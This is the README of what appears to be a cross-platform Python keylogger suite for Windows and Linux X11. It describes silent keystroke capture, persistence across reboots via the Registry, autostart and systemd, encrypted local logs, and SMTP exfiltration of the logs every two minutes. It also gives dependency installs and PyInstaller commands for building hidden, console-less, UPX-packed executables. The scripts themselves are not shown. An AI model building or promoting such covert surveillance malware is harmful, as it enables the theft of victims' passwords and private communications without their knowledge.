# Keylogger Suite

A collection of cross-platform Python keyloggers for Windows and Linux (X11) systems, designed to run silently in the background, persist across reboots, encrypt captured keystrokes, and periodically send logs via email.

## Components

- **Windows Keylogger** (`Keylogger_win_final.py`)
  - Captures keyboard input using `pynput`
  - Encrypts log file stored in `%APPDATA%`
  - Sets up persistence via Windows Registry
  - Sends encrypted logs via SMTP every 2 minutes

- **Linux Keylogger** (`Keylogger_lin_final.py`)
  - Captures keyboard input in X11 sessions using `pyxhook`
  - Encrypts log file in `~/.config`
  - Sets up persistence via autostart (`.desktop`) and systemd user service
  - Sends encrypted logs via SMTP every 2 minutes

## Features

- **Silent operation**: Runs unobtrusively without console windows.
- **Encrypted storage**: All keystrokes are stored in encrypted files.
- **Email reporting**: Automatic email of recent and full logs at configurable intervals.
- **Persistence**: Auto-start on system boot (Registry for Windows, Autostart/Systemd for Linux).
- **Cross-platform**: Supports Windows and Linux X11 environments.

## Requirements

- Python 3.6 or higher
- **Windows**: `pynput`, `cryptography`
- **Linux**: `python-xlib`, `pyxhook`, `cryptography`

Install dependencies via pip:

```bash
# Windows dependencies
pip install pynput cryptography

# Linux dependencies
pip install python-xlib pyxhook cryptography
```

## Usage

1. Edit the email configuration in each script:
   ```python
   MAIL_USER = "you@example.com"
   MAIL_PASS = "your_email_password"
   RECIPIENT_EMAIL = "recipient@example.com"
   ```
2. Run the script directly (or package with PyInstaller):
   ```bash
   # Windows
   python Keylogger_win_final.py

   # Linux (X11 only)
   python Keylogger_lin_final.py
   ```

3. To create standalone executables with PyInstaller:
   ```bash
   # Windows
   pyinstaller --onefile --noconsole --clean --strip --upx-dir /path/to/upx --log-level WARN --hidden-import=pynput.keyboard._win32 --hidden-import=pynput._util.win32 --hidden-import=cryptography.hazmat.bindings.openssl Keylogger_win_final.py
   
   # Linux
   pyinstaller --onefile --noconsole --clean --strip --upx-dir /path/to/upx --log-level WARN --hidden-import=pyxhook --hidden-import=Xlib --hidden-import=Xlib.display --hidden-import=cryptography.hazmat.bindings.openssl Keylogger_lin_final.py

   ```

## Configuration

- **Email interval**: Adjust `time_interval` (default `120` seconds).
- **Encryption password**: Hardcoded in `generate_key()` (modify as needed).

## Important Notes

- **Windows**: Requires execution context with access to `%APPDATA%` and Registry permissions.
- **Linux**: Must run within an X11 session (not Wayland).
- **Security**: Handle captured logs responsibly; ensure compliance with local laws and policies.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

